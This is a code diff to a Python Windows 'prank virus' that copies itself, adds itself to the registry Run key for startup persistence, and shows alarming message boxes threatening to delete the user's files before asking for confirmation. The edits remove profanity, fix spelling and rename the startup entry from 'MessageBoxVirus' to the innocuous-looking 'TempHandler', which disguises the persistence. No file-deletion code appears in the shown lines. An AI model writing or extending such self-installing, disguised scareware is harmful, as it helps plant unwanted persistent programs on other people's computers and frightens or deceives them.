@@ -14,7 +14,7 @@ def add_to_startup(file_path, app_name="temphandler"):
         reg.SetValueEx(key, app_name, 0, reg.REG_SZ, file_path)
         reg.CloseKey(key)
     except Exception as e:
-        messagebox.showerror(title="Error", message=f"You Fat Fuck!")
+        messagebox.showerror(title="Error", message=e)
 
 # Determine the source file path
 if getattr(sys, 'frozen', False):
@@ -33,14 +33,14 @@ try:
         if not os.path.exists(destination_file):
             shutil.copy2(source_file, destination_file)
 except PermissionError:
-    messagebox.showerror(title='Permission Denied!', message='You have to run this application as an administrator.')
+    messagebox.showerror(title='Access Denied!', message='You have to run this application as an administrator.')
     sys.exit()
 except Exception as e:
-    messagebox.showerror(title='Error', message=f'An unexpected error occurred, FUCK YOUUUU: {e}')
+    messagebox.showerror(title='Error', message=f'An unexpected error occurred: {e}')
     sys.exit()
 
 # Add the executable to startup
-add_to_startup(source_file, app_name="MessageBoxVirus")
+add_to_startup(source_file, app_name="TempHandler")
 
 messagebox.showinfo(title='Congratulations!', message='You have a virus!')
 messagebox.showwarning(title='WARNING!', message='This virus will break your computer apart!\nThis virus will delete all your files!\nThis virus will delete all your folders!\nThis virus will delete all your programs!\nThis virus will delete all your games!\nThis virus will delete all your music!\nThis virus will delete all your videos!\nThis virus will delete all your pictures!\nThis virus will delete all your documents!\nThis virus will delete all your downloads!\nThis virus will delete all your desktop items!')
@@ -48,7 +48,7 @@ messagebox.showwarning(title='WARNING!', message='This program contains flashing
 if messagebox.askyesno(title='DANGER!', message='Are you sure you want to run this virus?', icon='error'):
     if messagebox.askokcancel(title='Your last chance!', message='This is your last chance!\nAre you sure you want to run this virus?', icon='error'):
         
-        def show_loading_popup(title="System", message="Prepairing to compromize OS:"):
+        def show_loading_popup(title="System", message="Preparing to compromise OS:"):
             popup = tk.Toplevel()
             popup.title(title)
             popup.geometry("400x120")
